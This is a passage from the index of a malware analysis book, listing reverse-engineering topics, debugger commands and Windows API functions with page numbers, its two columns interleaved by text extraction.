<p class="calibre1">in IDA Pro, 95–97</p>
<p class="calibre1">covert launching techniques, 253–265</p>
<p class="calibre1">adding missing code, 342</p>
<p class="calibre1">APC injection, 262–265</p>
<p class="calibre1">navigating, 92–93</p>
<p class="calibre1">Detours, 262</p>
<p class="calibre1">and virtual functions, 436</p>
<p class="calibre1">hook injection, 259–261</p>
<p class="calibre1">CryptAcquireContext function, 455</p>
<p class="calibre1">labs, 266–267</p>
<p class="calibre1">cryptographic algorithms, 280–285</p>
<p class="calibre1">solutions, 586–607</p>
<p class="calibre1">recognizing strings and imports, </p>
<p class="calibre1">launchers, 253–254</p>
<p class="calibre1">281–282</p>
<p class="calibre1">process injection, 254–257</p>
<p class="calibre1">search for cryptographic constants, </p>
<p class="calibre1">process replacement, 257–259</p>
<p class="calibre1">282–283</p>
<p class="calibre1">CPU (central processing unit)</p>
<p class="calibre1">search for high-entropy content, </p>
<p class="calibre1">threads and, 149</p>
<p class="calibre1">283–285</p>
<p class="calibre1">in x86 architecture, 68</p>
<p class="calibre1">cryptography, drawbacks, 281</p>
<p class="calibre1">cpuid instruction, virtual machine </p>
<p class="calibre1">CWSandbox, 40</p>
<p class="calibre1">and, 374</p>
<p class="calibre1">crashing virtual machine, from </p>
<p class="calibre1"><b class="calibre3">D</b></p>
<p class="calibre1">procmon, 44</p>
<p class="calibre1">da command, in WinDbg, 210</p>
<p class="calibre1">CreateFile function, 137, 215, 219, </p>
<p class="calibre1">data</p>
<p class="calibre1">455, 520, 527, 583, 640</p>
<p class="calibre1">hard-coded vs. ephemeral, 314–315</p>
<p class="calibre1">debugger and, 171</p>
<p class="calibre1">overlaying onto structure, 214</p>
<p class="calibre1">CreateFileMapping function, 137–138, </p>
<p class="calibre1">Python script for converting to </p>
<p class="calibre1">455, 520, 527, 583</p>
<p class="calibre1">string, 500–501</p>
<p class="calibre1">CreateMutex function, 152, 455, 522</p>
<p class="calibre1">redefining in IDA Pro, 103</p>
<p class="calibre1">CreatePipe function, 233</p>
<p class="calibre1">data buffers, instructions for </p>
<p class="calibre1">CreateProcess function, 147–149, </p>
<p class="calibre1">manipulating, 81</p>
<p class="calibre1">233, 455, 479, 524, 544, 590, </p>
<p class="calibre1">data cross-references, 96–97</p>
<p class="calibre1">642, 727</p>
<p class="calibre1">data encoding, 269–294</p>
<p class="calibre1">parameters, 728</p>
<p class="calibre1">cryptographic algorithms, 280–285</p>
<p class="calibre1">CreateRemoteThread function, 256, 262, </p>
<p class="calibre1">recognizing strings and imports, </p>
<p class="calibre1">423, 455, 586, 600, 730</p>
<p class="calibre1">281–282</p>
<p class="calibre1">arguments for, 603–604</p>
<p class="calibre1">search for cryptographic </p>
<p class="calibre1">and direct injection, 257</p>
<p class="calibre1">constants, 282–283</p>
<p class="calibre1">for DLL injection, 255</p>
<p class="calibre1">search for high-entropy content, </p>
<p class="calibre1">CreateService function, 153, 243, 455, </p>
<p class="calibre1">283–285</p>
<p class="calibre1">514–516, 549, 550, 554</p>
<p class="calibre1">custom, 285–288</p>
<p class="calibre1">CreateThread function, 150–151</p>
<p class="calibre1">decoding, 288–294</p>
<p class="calibre1">CreateToolhelp32Snapshot function, 255, </p>
<p class="calibre1">instrumentation for generic </p>
<p class="calibre1">263, 455, 498</p>
<p class="calibre1">decryption, 291–294</p>
<p class="calibre1">CreateWindowEx function, 137</p>
<p class="calibre1">manual programming of </p>
<p class="calibre1">credential stealers, 234–241</p>
<p class="calibre1">functions, 289–290</p>
<p class="calibre1">GINA interception, 235–236, </p>
<p class="calibre1">self-decoding, 288–289</p>
<p class="calibre1">570–571</p>
<p class="calibre1"><b class="calibre3">738</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p772"/>goal of analyzing algorithms, 270</p>
<p class="calibre1">Windows debugger detection, </p>
<p class="calibre1">identifying and leveraging steps, </p>
<p class="calibre1">352–356</p>
<p class="calibre1">315–317</p>
<p class="calibre1">manually checking structures, </p>
<p class="calibre1">labs, 295–296</p>
<p class="calibre1">353–356</p>
<p class="calibre1">solutions, 607–626</p>
<p class="calibre1">with Windows API, 352–353</p>
<p class="calibre1">simple ciphers, 270–280</p>
<p class="calibre1">decoding, 288–294</p>
<p class="calibre1">Base64, 277–280</p>
<p class="calibre1">anti-debugging routine in, 663</p>
<p class="calibre1">Caesar cipher, 270</p>
<p class="calibre1">instrumentation for generic </p>
<p class="calibre1">other encoding schemes, </p>
<p class="calibre1">decryption, 291–294</p>
<p class="calibre1">276–277</p>
<p class="calibre1">manual programming of functions, </p>
<p class="calibre1">XOR cipher, 271–276</p>
<p class="calibre1">289–290</p>
<p class="calibre1">Data Execution Prevention </p>
<p class="calibre1">self-decoding, 288–289</p>
<p class="calibre1">(DEP), 578</p>
<p class="calibre1">stack-formed strings, 540–541</p>
<p class="calibre1">data section in main memory, 69</p>
<p class="calibre1">XOR-encoded strings, 542–543</p>
<p class="calibre1">.data section in PE file, 22</p>
<p class="calibre1">decryption</p>
<p class="calibre1">size of, 24</p>
<p class="calibre1">of AES, 625–626</p>
<p class="calibre1">DataDirectory array, 364</p>
<p class="calibre1">instrumentation for generic, </p>
<p class="calibre1">db command, in WinDbg, 558</p>
<p class="calibre1">291–294</p>
<p class="calibre1">dd command, in WinDbg, 210, </p>
<p class="calibre1">requirements for, 622</p>
<p class="calibre1">218, 564</p>
<p class="calibre1">Deep Freeze, 467</p>
<p class="calibre1">DDoS (distributed denial-of-service) </p>
<p class="calibre1">default view for IDA Pro, returning </p>
<p class="calibre1">attack, 234</p>
<p class="calibre1">to, 92</p>
<p class="calibre1">malware to launch, 517</p>
<p class="calibre1">default web browser, malware deter-</p>
<p class="calibre1">mination of, 699–703</p>
<p class="calibre1">debuggers, 167–178.  <i class="calibre4">See also</i> anti-</p>
<p class="calibre1">deferred breakpoint, 212–213, 554</p>
<p class="calibre1">debugging; Ollydbg; WinDbg</p>
<p class="calibre1">delete operator, 437</p>
<p class="calibre1">exceptions, 175–177</p>
<p class="calibre1">DeleteFile function, PyCommand to </p>
<p class="calibre1">first- and second-chance, 176</p>
<p class="calibre1">prevent execution, 201</p>
<p class="calibre1">identifying behavior, 356–359</p>
<p class="calibre1">Delphi programs, compile time, 23</p>
<p class="calibre1">INT scanning, 357</p>
<p class="calibre1">DEP (Data Execution Prevention), 578</p>
<p class="calibre1">performing code checksums, 357</p>
<p class="calibre1">Dependency Walker ( <i class="calibre4">depends.exe</i>), </p>
<p class="calibre1">timing checks, 357–359</p>
<p class="calibre1">16–17, 49, 468, 480</p>
<p class="calibre1">interference with functionality, </p>
<p class="calibre1">destructor, 437</p>
<p class="calibre1">359–363</p>
<p class="calibre1">Detail filter, in procmon, 45</p>
<p class="calibre1">exceptions, 361–362</p>
<p class="calibre1">Detours, 262</p>
<p class="calibre1">inserting interrupts, 362–363</p>
<p class="calibre1">device drivers, 206</p>
<p class="calibre1">TLS callbacks, 359–361</p>
<p class="calibre1">analysis, 562</p>
<p class="calibre1">just-in-time, 411</p>
<p class="calibre1">finding in kernel, 217</p>
<p class="calibre1">kernel vs. user mode, 168–169</p>
<p class="calibre1">finding in memory, with </p>
<p class="calibre1">Microsoft symbols, 212–215</p>
<p class="calibre1">WinDbg, 563</p>
<p class="calibre1">modifying program execution </p>
<p class="calibre1">IDA Pro to open, 551</p>
<p class="calibre1">with, 177</p>
<p class="calibre1">loading, 226</p>
<p class="calibre1">source-level vs. assembly-level, 168</p>
<p class="calibre1">tool for loading, 470–471</p>
<p class="calibre1">using, 169–175</p>
<p class="calibre1">WinDbg for viewing, 551–553</p>
<p class="calibre1">breakpoints, 171–175</p>
<p class="calibre1">device object</p>
<p class="calibre1">single-stepping, 169–170</p>


<p class="calibre1">obtaining handle to, 216</p>
<p class="calibre1">stepping-over vs. stepping-into, </p>
<p class="calibre1">viewing in kernel, 218</p>
<p class="calibre1">170–171</p>
<p class="calibre1"> <i class="calibre4">\Device\PhysicalDisk1</i>, 138</p>
<p class="calibre1">vulnerabilities, 363–365</p>
<p class="calibre1"> <i class="calibre4">\Device\PhysicalMemory</i>, 139</p>
<p class="calibre1">DeviceIoControl function, 206, 216, </p>
<p class="calibre1">219, 455, 561–562, 565–566</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">739</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p773"/>!devobj command, in WinDbg, 220</p>
<p class="calibre1">DomainTools, 301</p>
<p class="calibre1">digital logic, 66</p>
<p class="calibre1">double-packed malware, 397</p>
<p class="calibre1">digital signatures, 48</p>
<p class="calibre1">downloaders, 3, 231–232</p>
<p class="calibre1">direct injection, 254–257</p>
<p class="calibre1">malware as, 481–482</p>
<p class="calibre1">disassembler, 3, 67.  <i class="calibre4">See also</i> anti-</p>
<p class="calibre1">downloading malware, opening URL </p>
<p class="calibre1">disassembly; IDA Pro (Interac-</p>
<p class="calibre1">for, 651–652, 654</p>
<p class="calibre1">tive Disassembler Professional)</p>
<p class="calibre1">driver objects</p>
<p class="calibre1">Disassembler window, in OllyDbg, 182</p>
<p class="calibre1">finding, 220–221</p>
<p class="calibre1">disassembly, 65.  <i class="calibre4">See also</i> x86 </p>
<p class="calibre1">getting list, 552</p>
<p class="calibre1">disassembly</p>
<p class="calibre1">structure in Windows, 206</p>
<p class="calibre1">enhancing in IDA Pro, 100–103</p>
<p class="calibre1">driver signature, 64-bit versions of </p>
<p class="calibre1">of Hello World program, 412</p>
<p class="calibre1">Windows and, 227</p>
<p class="calibre1">distance Snort rule keyword, 305</p>
<p class="calibre1">DriverEntry function, 206, 551</p>
<p class="calibre1">distributed denial-of-service (DDoS) </p>
<p class="calibre1">DriverInit function, 214, 563</p>
<p class="calibre1">attack, 234</p>
<p class="calibre1">DriverUnload command, 563</p>
<p class="calibre1">malware to launch, 517</p>
<p class="calibre1">!drvobj command, in WinDbg, 217</p>
<p class="calibre1">div instruction, 75</p>
<p class="calibre1">dt command, in WinDbg, 217, 552, </p>
<p class="calibre1">divide-by-zero exception, 653, 668</p>
<p class="calibre1">563, 565</p>
<p class="calibre1">DLL display window, in Process </p>
<p class="calibre1">du command, in WinDbg, 210</p>
<p class="calibre1">Explorer, 48</p>
<p class="calibre1">dummy names, 100</p>
<p class="calibre1">DLL injection, 286-289, 621, 676, 730</p>
<p class="calibre1">changing, 111</p>
<p class="calibre1">DLL load-order hijacking, </p>
<p class="calibre1">Dummy service, in INetSim, 56</p>
<p class="calibre1">244–245</p>
<p class="calibre1">dump command, in OllyDbg, 658</p>
<p class="calibre1">DllCanUnloadNow function, 157, 456</p>
<p class="calibre1">dumping executable from </p>
<p class="calibre1">DllEntryPoint function, 495</p>
<p class="calibre1">memory, 469</p>
<p class="calibre1">DllGetClassObject function, 157, 456</p>
<p class="calibre1">OllyDump for, 390</p>
<p class="calibre1">DllInstall function, 157, 456</p>
<p class="calibre1">dwo command, in WinDbg, 211</p>
<p class="calibre1">DllMain function, 43, 146, 254, 401, 495</p>
<p class="calibre1">DWORD</p>
<p class="calibre1">determining number of functions </p>
<p class="calibre1">call instruction with target based </p>
<p class="calibre1">called by, 499</p>
<p class="calibre1">on, 396</p>
<p class="calibre1">DLL_PROCESS_ATTACH, 573</p>
<p class="calibre1">in Windows API, 136</p>
<p class="calibre1">DllRegisterServer function, 157, 456</p>
<p class="calibre1">dynamic analysis, 39–60, 65.  <i class="calibre4">See also</i> </p>
<p class="calibre1">DLLs.  <i class="calibre4">See</i> dynamic link libraries (DLLs)</p>
<p class="calibre1">debuggers</p>
<p class="calibre1">DllUnregisterServer function, 157, 456</p>
<p class="calibre1">advanced, 3</p>
<p class="calibre1">DNS (Domain Name System)</p>
<p class="calibre1">basic, 2–3</p>
<p class="calibre1">attackers tunneling information, 309</p>
<p class="calibre1">basic tools in practice, 56–59</p>
<p class="calibre1">attackers’ use of, 309</p>
<p class="calibre1">benefits of, 39</p>
<p class="calibre1">server, malware access to, 34</p>
<p class="calibre1">Capture BAT for, 467</p>
<p class="calibre1">tools for controlling responses, 465</p>
<p class="calibre1">combining with static analysis, </p>
<p class="calibre1">DNS requests</p>
<p class="calibre1">307–321</p>
<p class="calibre1">ApateDNS response to, 51–52</p>
<p class="calibre1">comparing Registry snapshots with </p>
<p class="calibre1">checking for, 57</p>
<p class="calibre1">Regshot, 50–51</p>
<p class="calibre1">documentation manuals, for x86 </p>
<p class="calibre1">faking network, 51–53</p>
<p class="calibre1">architecture, 85</p>
<p class="calibre1">INetSim, 55–56</p>
<p class="calibre1">domain</p>
<p class="calibre1">labs, 61–62</p>
<p class="calibre1">blacklists, 301</p>
<p class="calibre1">solutions, 482–493</p>
<p class="calibre1">getting information, 300–302</p>
<p class="calibre1">packet sniffing with Wireshark, </p>
<p class="calibre1">and malicious activity, 299</p>
<p class="calibre1">53–55</p>
<p class="calibre1">Domain Name System.  <i class="calibre4">See</i> DNS </p>
<p class="calibre1">Process Explorer for viewing </p>
<p class="calibre1">(Domain Name System)</p>
<p class="calibre1">processes, 47–50</p>
<p class="calibre1"><b class="calibre3">740</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p774"/>Process Monitor (procmon), 43–46</p>
<p class="calibre1">Electronic Code Book (ECB), 626</p>
<p class="calibre1">running malware, 42–43</p>
<p class="calibre1">ELF (Executable and Linking For-</p>
<p class="calibre1">sandboxes, 40–42</p>
<p class="calibre1">mat), IDA Pro support for, 87</p>
<p class="calibre1">drawbacks, 41–42</p>
<p class="calibre1">EM64T architecture, 441</p>
<p class="calibre1">dynamic link libraries (DLLs), 12, 17, </p>
<p class="calibre1">email-stealing malware, 572</p>
<p class="calibre1">145–147</p>
<p class="calibre1">Emerging Threats list of signatures, 304</p>
<p class="calibre1">analyzing in IDA Pro, 521–525</p>
<p class="calibre1">EnableExecuteProtectionSupport </p>
<p class="calibre1">base address different from </p>
<p class="calibre1">function, 456</p>
<p class="calibre1">preferred, 88</p>
<p class="calibre1">encoding.  <i class="calibre4">See</i> data encoding</p>
<p class="calibre1">basic structure, 146–147</p>
<p class="calibre1">encoding functions, 614, 725</p>
<p class="calibre1">Detours to add new to existing </p>
<p class="calibre1">encrypted files</p>
<p class="calibre1">binaries, 262</p>
<p class="calibre1">first bytes of, 286</p>
<p class="calibre1">injection, 254–257</p>
<p class="calibre1">writing, 614</p>
<p class="calibre1">debugger view, 256</p>
<p class="calibre1">encrypted write, function graph of, 287</p>
<p class="calibre1">launching, 42</p>
<p class="calibre1">encryption</p>
<p class="calibre1">loading in OllyDbg, 191–192</p>
<p class="calibre1">decoding algorithm with </p>
<p class="calibre1">load-order hijacking, for </p>
<p class="calibre1">OllyDbg, 616</p>
<p class="calibre1">persistence, 244–245</p>
<p class="calibre1">indications of, 618</p>
<p class="calibre1">malware as, 42</p>
<p class="calibre1">relationship of functions, 621–622</p>
<p class="calibre1">memory addresses for, 184–185</p>
<p class="calibre1">endianness, in x86 architecture, 70</p>
<p class="calibre1">memory map to locate, 546–547</p>
<p class="calibre1">enter instruction, 77</p>
<p class="calibre1">packed, 401</p>
<p class="calibre1">entropy calculation, for packed </p>
<p class="calibre1">Process Explorer for finding </p>
<p class="calibre1">executables, 387–388</p>
<p class="calibre1">injection, 589</p>
<p class="calibre1">entropy score, dependency with </p>
<p class="calibre1">dynamic linking, 16</p>
<p class="calibre1">chunk size, 284</p>
<p class="calibre1">dynamic unpacking programs, </p>
<p class="calibre1">EnumProcesses function, 456, 730</p>
<p class="calibre1">automated, 389</p>
<p class="calibre1">EnumProcessModules function, 456</p>
<p class="calibre1">dynamically linked functions, explor-</p>
<p class="calibre1">epilogue</p>
<p class="calibre1">ing with Dependency Walker, </p>
<p class="calibre1">64-bit code, 446–447</p>
<p class="calibre1">16–17</p>
<p class="calibre1">in functions, 77</p>
<p class="calibre1">EPROCESS structure</p>
<p class="calibre1"><b class="calibre3">E</b></p>
<p class="calibre1">changing, 566</p>
<p class="calibre1">examining in WinDbg, 565</p>
<p class="calibre1">EA (effective address), in IDAPython </p>
<p class="calibre1">error message strings</p>
<p class="calibre1">scripts, 105</p>
<p class="calibre1">finding in binary, 503–504</p>
<p class="calibre1">Eagle, Chris,  <i class="calibre4">The IDA Pro Book</i>, 88</p>
<p class="calibre1">indicators of malware’s likely </p>
<p class="calibre1">EAT (export address table), hooking </p>
<p class="calibre1">functions, 718</p>
<p class="calibre1">method and, 248</p>
<p class="calibre1">ESI register, 81</p>
<p class="calibre1">EAX register, 75, 646</p>
<p class="calibre1">ESP register, 77, 348</p>
<p class="calibre1">EBP register, 77</p>
<p class="calibre1">event capture, toggling on and off in </p>
<p class="calibre1">ECB (Electronic Code Book), 626</p>
<p class="calibre1">procmon, 749</p>
<p class="calibre1">Eckel, Bruce,  <i class="calibre4">Thinking in C++</i>, 428</p>
<p class="calibre1">event flow, in Windows with and with-</p>
<p class="calibre1">ECX register, this parameter and, 429</p>
<p class="calibre1">out hook injection, 259</p>
<p class="calibre1">.edata section, in PE file, 22</p>
<p class="calibre1">Ex suffix, for Windows functions, 17</p>
<p class="calibre1">EDI register, 81</p>
<p class="calibre1">exception handlers</p>
<p class="calibre1">EDX register, 75</p>
<p class="calibre1">in 64-bit systems, 445, 447</p>
<p class="calibre1">effective address (EA), in IDAPython </p>
<p class="calibre1">building, 653</p>
<p class="calibre1">scripts, 105</p>
<p class="calibre1">misusing structured, 344–346</p>
<p class="calibre1">EFLAGS register, 72</p>
<p class="calibre1">in OllyDbg, 194–195</p>
<p class="calibre1">EIP (instruction pointer), 73</p>
<p class="calibre1">properly disassembled code, 654</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">741</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p775"/>ExceptionHandler function, 345</p>
<p class="calibre1">fastcall calling convention, 120</p>
<p class="calibre1">EXCEPTION_REGISTRATION data </p>
<p class="calibre1">fibers, in Microsoft systems, 151</p>
<p class="calibre1">structure, 344</p>
<p class="calibre1">“File contains too much data” error, </p>
<p class="calibre1">exceptions, 344, 361–362</p>
<p class="calibre1">in OllyDbg, 364</p>
<p class="calibre1">in debuggers, 175–177</p>
<p class="calibre1">file mappings, 137–138</p>
<p class="calibre1">first- and second-chance, 176</p>
<p class="calibre1">file signatures, 10</p>
<p class="calibre1">in Windows, 157–158</p>
<p class="calibre1">File system filters, in procmon, 46</p>
<p class="calibre1">exclusive OR cipher.  <i class="calibre4">See</i> XOR cipher</p>
<p class="calibre1">file system functions, in Windows API, </p>
<p class="calibre1"> <i class="calibre4">.exe</i> files, program infecting, 519</p>
<p class="calibre1">137–138</p>
<p class="calibre1">Executable and Linking Format (ELF), </p>
<p class="calibre1">FILE_BOTH_DIR_INFORMATION structure, </p>
<p class="calibre1">IDA Pro support for, 87</p>
<p class="calibre1">558–559</p>
<p class="calibre1">executables.  <i class="calibre4">See also</i> packed </p>
<p class="calibre1">FileInformation structure, 558–559</p>
<p class="calibre1">executables</p>
<p class="calibre1">FileInsight, 468</p>
<p class="calibre1">dumping from memory, 469</p>
<p class="calibre1">FileMon tool, 43</p>
<p class="calibre1">function import by ordinal, </p>
<p class="calibre1">files</p>
<p class="calibre1">16–17, 43</p>
<p class="calibre1">brute-forcing many, 273</p>
<p class="calibre1">loading, 384–385</p>
<p class="calibre1">checking names, 541</p>
<p class="calibre1">into address space of another </p>
<p class="calibre1">hidden, 558–559</p>
<p class="calibre1">process, 595</p>
<p class="calibre1">recovering, 559–560</p>
<p class="calibre1">in IDA Pro, 88–89</p>
<p class="calibre1">malware creation of, 612</p>
<p class="calibre1">opening in OllyDbg, 180–181</p>
<p class="calibre1">malware modification of, 527–529</p>
<p class="calibre1">PEiD plug-ins running of, 14</p>
<p class="calibre1">malware opening of, 714–716</p>
<p class="calibre1">searching for strings in, 11</p>
<p class="calibre1">malware uploading of, 716</p>
<p class="calibre1">shellcode as, 407</p>
<p class="calibre1">transferring from virtual </p>
<p class="calibre1">termination, 656–657</p>
<p class="calibre1">machine, 36</p>
<p class="calibre1">exit, analysis of immediate, 724</p>
<p class="calibre1">writing from kernel space, 215</p>
<p class="calibre1">expediency, vs. accuracy, 304</p>
<p class="calibre1">Filter dialog in Process Monitor, 484</p>
<p class="calibre1">exploits, 245</p>
<p class="calibre1">filters</p>
<p class="calibre1"> <i class="calibre4">explorer.exe</i></p>
<p class="calibre1">in procmon, 44–46</p>
<p class="calibre1">code search for, 732</p>
<p class="calibre1">in Wireshark, 53</p>
<p class="calibre1">writing path into process, 588</p>
<p class="calibre1">Find OEP plug-in (Section Hop), 391</p>
<p class="calibre1">export address table (EAT), hooking </p>
<p class="calibre1">FindCrypt2, 283</p>
<p class="calibre1">method and, 248</p>
<p class="calibre1">output, 619</p>
<p class="calibre1">export data, in IMAGE_EXPORT_DIRECTORY </p>
<p class="calibre1">FindFirstFile function, 20, 456, </p>
<p class="calibre1">array, 416</p>
<p class="calibre1">478–479, 520, 527, 715</p>
<p class="calibre1">exported functions, 18</p>
<p class="calibre1">finding</p>
<p class="calibre1">absence of, 521</p>
<p class="calibre1">networking code, 313</p>
<p class="calibre1">Exports window, in IDA Pro, 91</p>
<p class="calibre1">original entry point (OEP), </p>
<p class="calibre1">$EXTERNAL_NET variable, in Snort, 303</p>
<p class="calibre1">391–395</p>
<p class="calibre1">with automated tools, 391–392</p>
<p class="calibre1"><b class="calibre3">F</b></p>
<p class="calibre1">manually, 392–395</p>
<p class="calibre1">fake services, 55</p>
<p class="calibre1">strings, 11–13</p>
<p class="calibre1">FakeDNS, 469</p>
<p class="calibre1">findKernel32Base function, 419, </p>
<p class="calibre1">faking networks, 51–53</p>
<p class="calibre1">697, 707</p>
<p class="calibre1">Netcat (nc) for monitoring, 52–53</p>
<p class="calibre1">FindNextFile function, 20, 478–479, </p>
<p class="calibre1">false positives, in Snort, 306</p>
<p class="calibre1">520, 715</p>
<p class="calibre1">Fast Library Identification and </p>
<p class="calibre1">FindResource function, 254, 456, 596, </p>
<p class="calibre1">Recognition Technology </p>
<p class="calibre1">600, 609</p>
<p class="calibre1">(FLIRT), 88</p>
<p class="calibre1">findSymbolByHash function, 418, 419, </p>
<p class="calibre1">signature detection, 541</p>
<p class="calibre1">697, 707</p>
<p class="calibre1"><b class="calibre3">742</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p776"/>FindWindow function, 456, 662–663</p>
<p class="calibre1">disassembly and memory </p>
<p class="calibre1">to search for debugger, 356</p>
<p class="calibre1">dump, 174</p>
<p class="calibre1">firewall</p>
<p class="calibre1">executable import by ordinal, </p>
<p class="calibre1">and kernel patching, 227</p>
<p class="calibre1">16–17, 43</p>
<p class="calibre1">for virtual machine, 33</p>
<p class="calibre1">executable use of, 15–18</p>
<p class="calibre1">firmware, 66</p>
<p class="calibre1">exported, 18</p>
<p class="calibre1">flags, 72–73</p>
<p class="calibre1">finding connection between, 622</p>
<p class="calibre1">fldz instruction, 412</p>
<p class="calibre1">finding that installs hook, 223</p>
<p class="calibre1">FlexHEX, 468</p>
<p class="calibre1">graphing cross-references, 498</p>
<p class="calibre1">Flink pointers, 414</p>
<p class="calibre1">graphs of calls, 98</p>
<p class="calibre1">FLIRT (Fast Library Identification and </p>
<p class="calibre1">hard-coded locations for calls, 410</p>
<p class="calibre1">Recognition Technology), 88</p>
<p class="calibre1">identifying at stored memory </p>
<p class="calibre1">signature detection, 541</p>
<p class="calibre1">location, 695</p>
<p class="calibre1">floating-point instruction, 130</p>
<p class="calibre1">imported, 18, 19</p>
<p class="calibre1">flow chart, of current function, 98</p>
<p class="calibre1">naming conventions, 17</p>
<p class="calibre1">flow control, obscuring, 340–346</p>
<p class="calibre1">overloading in object-oriented </p>
<p class="calibre1">adding missing code cross-</p>
<p class="calibre1">programming, 430–431</p>
<p class="calibre1">references in IDA Pro, 342</p>
<p class="calibre1">program termination by, 656–657</p>
<p class="calibre1">function pointer problem, 340–341</p>
<p class="calibre1">recursive, 527</p>
<p class="calibre1">misusing structured exception </p>
<p class="calibre1">search for information on, 19</p>
<p class="calibre1">handlers, 344–346</p>
<p class="calibre1">stepping-over vs. stepping-into, </p>
<p class="calibre1">return pointer abuse, 342–343</p>
<p class="calibre1">394–395</p>
<p class="calibre1">flow-oriented disassembly, 329, </p>
<p class="calibre1">virtual vs. nonvirtual, 432–436</p>
<p class="calibre1">331–334</p>
<p class="calibre1">vtables, 434–435</p>
<p class="calibre1">flow Snort rule keyword, 305</p>
<p class="calibre1">Functions window, in IDA Pro, 91</p>
<p class="calibre1">fnstenv instruction, structure for, </p>
<p class="calibre1">411–412</p>
<p class="calibre1"><b class="calibre3">G</b></p>
<p class="calibre1">for loops, 116–118</p>
<p class="calibre1">g (go) command, in WinDbg, 211</p>
<p class="calibre1">ForceFlags field, in heap header, 355</p>
<p class="calibre1">GCC (GNU Compiler Convention), </p>
<p class="calibre1">format string, identifying, 505</p>
<p class="calibre1">calling conventions, 121</p>
<p class="calibre1">formatting operands, in IDA Pro, 100</p>
<p class="calibre1"> <i class="calibre4">GDI32.dll</i>, 17</p>
<p class="calibre1">FPU (x87 floating-point unit), 411–413</p>
<p class="calibre1">importing from, 20</p>
<p class="calibre1">FpuSaveState structure, 411</p>
<p class="calibre1">GDT (global descriptor table), 374</p>
<p class="calibre1">frame functions, 446</p>
<p class="calibre1">GDT register (GDTR), 374</p>
<p class="calibre1">FS segment register, and SEH chain, </p>
<p class="calibre1">general registers, 71–72</p>
<p class="calibre1">344, 354</p>
<p class="calibre1">in x64 architecture, 443</p>
<p class="calibre1"> <i class="calibre4">fsgina.dll</i>, 235</p>
<p class="calibre1">GET request, 309</p>
<p class="calibre1">fstenv instruction, structure for, </p>
<p class="calibre1">and malicious activity, 299</p>
<p class="calibre1">411–412</p>
<p class="calibre1">malware construction of, 539</p>
<p class="calibre1">FtpPutFile function, 456, 714</p>
<p class="calibre1">GetAdaptersInfo function, 456</p>
<p class="calibre1">FtpSetCurrentDirectory function, 714</p>
<p class="calibre1">dynamic resolution, 680</p>
<p class="calibre1">function pointers, 435</p>
<p class="calibre1">getaddrinfo function, 313</p>
<p class="calibre1">problem, 340–341</p>
<p class="calibre1">GetAsyncKeyState function, 239, 457, </p>
<p class="calibre1">functions</p>
<p class="calibre1">581, 585</p>
<p class="calibre1">analysis to determine stack frame </p>
<p class="calibre1">GetCommandLineA function, 395</p>
<p class="calibre1">construction, 347</p>
<p class="calibre1">breakpoint on, 400</p>
<p class="calibre1">analyzing in IDA Pro, 97–98</p>
<p class="calibre1">getContent function, 615</p>
<p class="calibre1">graphically, 114</p>
<p class="calibre1">GetCurrentProcessId function, 547</p>
<p class="calibre1">call conventions, 119–121</p>
<p class="calibre1">GetCurrentThreadId function, 575</p>
<p class="calibre1">decision to skip analysis, 526</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">743</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p777"/>GetDC function, 457</p>
<p class="calibre1">graph mode, in IDA Pro, 89–90, </p>
<p class="calibre1">GetFileSize function, 708</p>
<p class="calibre1">98–99</p>
<p class="calibre1">GetForegroundWindow function, 239–240, </p>
<p class="calibre1">Graphical Identification and Authen-</p>
<p class="calibre1">457, 581, 585, 598–599</p>
<p class="calibre1">tication (GINA) interception, </p>
<p class="calibre1">GetHash function, 236</p>
<p class="calibre1">235–236</p>
<p class="calibre1">gethostbyname function, 313, 314, 457, </p>
<p class="calibre1">indications of, 567–571</p>
<p class="calibre1">495–496, 727</p>
<p class="calibre1"> <i class="calibre4">Gray Hat Python</i> (Seitz), 201</p>
<p class="calibre1">gethostname function, 457, 611, 650</p>
<p class="calibre1">GUI manipulation functions, 20</p>
<p class="calibre1">GetKeyState function, 240, 457</p>
<p class="calibre1">GUI programs, </p>
<p class="calibre1">GetModuleBaseNameA function, 587</p>
<p class="calibre1">IMAGE_SUBSYSTEM_WINDOWS_GUI </p>
<p class="calibre1">GetModuleFileName function, 457, 515, </p>
<p class="calibre1">value for, 23</p>
<p class="calibre1">531, 541, 575</p>
<p class="calibre1">GUIDs (globally unique identifiers), </p>
<p class="calibre1">GetModuleHandle function, 395, 457, 609</p>
<p class="calibre1">155</p>
<p class="calibre1">breakpoint on, 400</p>
<p class="calibre1">GetProcAddress function, 13, 15, 224, </p>
<p class="calibre1"><b class="calibre3">H</b></p>
<p class="calibre1">237, 256, 387, 413, 457, 520</p>
<p class="calibre1">setting breakpoints on, 395</p>
<p class="calibre1"> <i class="calibre4">hal.dll</i>, malicious drivers and, 207</p>
<p class="calibre1">unpacking stub import of, 385</p>
<p class="calibre1">handles</p>
<p class="calibre1">GetStartupInfo function, 457</p>
<p class="calibre1">for device objects, 220</p>
<p class="calibre1">GetSystemDefaultLangId function, </p>
<p class="calibre1">obtaining, 216</p>
<p class="calibre1">457, 498</p>
<p class="calibre1">for injecting malicious DLL, 255</p>
<p class="calibre1">GetSystemDefaultLCID function, 178</p>
<p class="calibre1">locating for PDF document, 708</p>
<p class="calibre1">GetTempPath function, 457, 604</p>
<p class="calibre1">obtaining to  <i class="calibre4">samsrv.dll</i> and </p>
<p class="calibre1">GetThreadContext function, 458, </p>
<p class="calibre1"> <i class="calibre4">advapi32.dll</i>, 237</p>
<p class="calibre1">590, 591</p>
<p class="calibre1">for service, OpenService function </p>
<p class="calibre1">GetTickCount function, 313, 314, 315, </p>
